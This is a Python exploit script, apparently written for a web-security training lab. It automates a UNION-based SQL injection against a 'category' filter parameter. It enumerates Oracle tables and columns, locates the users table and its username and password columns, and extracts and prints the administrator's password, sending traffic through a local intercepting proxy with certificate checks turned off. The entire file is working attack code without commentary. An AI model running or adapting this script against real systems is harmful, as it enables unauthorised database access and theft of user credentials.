import requests
import sys
import urllib3
from bs4 import BeautifulSoup as BS
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def perform_request(url, sql_payload):
    path = '/filter?category='
    r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
    return r.text


def exploit_sqli_users_table(url):
    sql_payload = "' UNION SELECT table_name, NULL FROM all_tables--"
    res = perform_request(url, sql_payload)
    soup = BS(res, 'html.parser')
    users_table = soup.find(text=re.compile('^USERS\_.*'))
    return users_table

def exploit_sqli_users_columns(url, users_table):
    sql_payload = "' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = '%s'--" % users_table
    res = perform_request(url, sql_payload)
    soup = BS(res, 'html.parser')
    usernames_column = soup.find(text=re.compile('.*USERNAME.*'))
    passwords_column = soup.find(text=re.compile('.*PASSWORD.*'))
    return usernames_column, passwords_column


def exploit_sqli_administrator_pass(url, users_table, usernames_column, passwords_column):
    sql_payload = f"' UNION SELECT {usernames_column}, {passwords_column} FROM {users_table}--"
    res = perform_request(url, sql_payload)
    soup = BS(res, 'html.parser')
    admin_password = soup.find(text='administrator').parent.findNext('td').contents[0]
    return admin_password


if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print('[-] Usage: %s <url>' % sys.argv[0])
        print('[-] Example: %s www.example.com' % sys.argv[0])
        sys.exit(-1)

    print('[+] Figuring out the users table...')
    users_table = exploit_sqli_users_table(url)
    if users_table :
        print('[+] Found the users table name: %s' % users_table)
        print('[+] Figuring out the usernames and passwords column...')
        usernames_column, passwords_column = exploit_sqli_users_columns(url, users_table)
        if usernames_column and passwords_column:
            print('[+] Found the usernames column name: %s' % usernames_column)
            print('[+] Found the passwords column name: %s' % passwords_column)
            print('[+] Figuring out the administrator password...')
            admin_password = exploit_sqli_administrator_pass(url, users_table, usernames_column, passwords_column)
            if admin_password :
                print('[+] the administrator password %s' % admin_password)
            else:
                print('[-] Did not find the administrator password.')
        else:
            print('[-] Did not find the usernames and/or passwords column.')
    else:
        print('[-] Did not find the users table name.')    

